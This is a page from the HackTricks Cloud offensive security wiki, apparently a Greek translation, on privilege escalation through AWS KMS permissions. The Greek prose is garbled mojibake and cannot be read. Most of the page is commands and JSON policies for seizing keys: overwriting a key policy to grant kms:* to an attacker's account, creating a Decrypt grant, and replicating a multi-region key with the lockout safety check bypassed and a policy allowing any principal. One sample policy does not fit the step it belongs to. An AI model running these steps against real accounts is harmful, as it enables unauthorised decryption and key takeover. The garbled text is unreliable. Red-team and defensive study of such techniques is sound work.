# AWS - KMS Privesc

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## KMS

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ KMS ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### `kms:ListKeys`,`kms:PutKeyPolicy`, (`kms:ListKeyPolicies`, `kms:GetKeyPolicy`)

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯** ÏÏƒÏ„Îµ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ:

{% code overflow="wrap" %}
```bash
aws kms list-keys
aws kms list-key-policies --key-id <id> # Although only 1 max per key
aws kms get-key-policy --key-id <id> --policy-name <policy_name>
# AWS KMS keys can only have 1 policy, so you need to use the same name to overwrite the policy (the name is usually "default")
aws kms put-key-policy --key-id <id> --policy-name <policy_name> --policy file:///tmp/policy.json
```
{% endcode %}

policy.json:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "kms:CreateKey",
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "kms:CreateAlias",
                "kms:UpdateAlias"
            ],
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": "kms:PutKeyPolicy",
            "Resource": "*"
        }
    ]
}
```

Î‘Ï…Ï„Î® Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… KMS key, Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ alias Î³Î¹Î± Ï„Î¿ key, ÎºÎ±Î¹ Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿ key. ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î½Î­Î¿ key, Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï€Î¿Ï… Ï„Î¿Ï… Î´Î¯Î½ÎµÎ¹ Ï€Î»Î®ÏÎ· Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÏ„Î¿ key, ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ key Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î½Î± Ï…Ï€Î¿Î³ÏÎ¬ÏˆÎµÎ¹ Î¼Î·Î½ÏÎ¼Î±Ï„Î±.

### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… KMS key

```sh
aws kms create-key --description "My new key"
```

Î‘Ï…Ï„ÏŒ Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î½Î­Î¿ KMS key ÎºÎ±Î¹ Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿ KeyId Ï„Î¿Ï….

### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ alias Î³Î¹Î± Ï„Î¿ Î½Î­Î¿ key

```sh
aws kms create-alias --alias-name alias/my-new-key --target-key-id <KeyId>
```

Î‘Ï…Ï„ÏŒ Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± alias Î³Î¹Î± Ï„Î¿ Î½Î­Î¿ key, ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿ ÏƒÏ„Î· Ï‡ÏÎ®ÏƒÎ·.

### Î¤Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿ Î½Î­Î¿ key

```sh
aws kms put-key-policy --key-id <KeyId> --policy file://policy.json
```

Î‘Ï…Ï„ÏŒ Î¸Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÎ¹ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï€Î¿Ï… Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ policy.json ÏƒÏ„Î¿ Î½Î­Î¿ key, Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï€Î»Î®ÏÎ· Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿.
```json
{
"Version" : "2012-10-17",
"Id" : "key-consolepolicy-3",
"Statement" : [
{
"Sid" : "Enable IAM User Permissions",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<origin_account>:root"
},
"Action" : "kms:*",
"Resource" : "*"
},
{
"Sid" : "Allow all use",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : [ "kms:*" ],
"Resource" : "*"
}
]
}
```
### `kms:CreateGrant`

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ principal Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î­Î½Î± KMS key:
```bash
aws kms create-grant \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
--grantee-principal arn:aws:iam::123456789012:user/exampleUser \
--operations Decrypt
```
{% hint style="warning" %}
ÎˆÎ½Î± grant Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î¼ÏŒÎ½Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½: [https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations)
{% endhint %}

{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„Î¿ÏÎ½ Î¼ÎµÏÎ¹ÎºÎ¬ Î»ÎµÏ€Ï„Î¬ Î³Î¹Î± Î½Î± **ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿ KMS ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î¼ÎµÏ„Î¬ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… grant**. ÎœÏŒÎ»Î¹Ï‚ Ï€ÎµÏÎ¬ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚, Î¿ principal Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ KMS key Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¯Ï€Î¿Ï„Î±.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ grant Î±Î¼Î­ÏƒÏ‰Ï‚ [Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î­Î½Î± grant token](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token) (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÎºÏÎ´Î¹ÎºÎ±).\
Î“Î¹Î± [**Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ**](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token).
{% endhint %}
```bash
# Use the grant token in a request
aws kms generate-data-key \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
â€“-key-spec AES_256 \
--grant-tokens $token
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï€Î±ÏÎ±Î¸Î­ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÏ€Î¹Ï‡Î¿ÏÎ·Î³Î®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½ Î¼Îµ:
```bash
aws kms list-grants --key-id <value>
```
### `kms:CreateKey`, `kms:ReplicateKey`

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Î­Î½Î± multi-region enabled KMS key ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Ï€ÎµÏÎ¹Î¿Ï‡Î® Î¼Îµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®.

ÎˆÏ„ÏƒÎ¹, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ privesc Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ® Ï„Î¿Ï… ÏƒÏ„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹

{% code overflow="wrap" %}
```bash
aws kms replicate-key --key-id mrk-c10357313a644d69b4b28b88523ef20c --replica-region eu-west-3 --bypass-policy-lockout-safety-check --policy file:///tmp/policy.yml

{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% endcode %}

### `kms:Decrypt`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎºÎ¬Ï€Î¿Î¹Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½.\
Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î£Ï…Î¼Î¼ÎµÏ„Î¬ÏƒÏ‡ÎµÏ„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
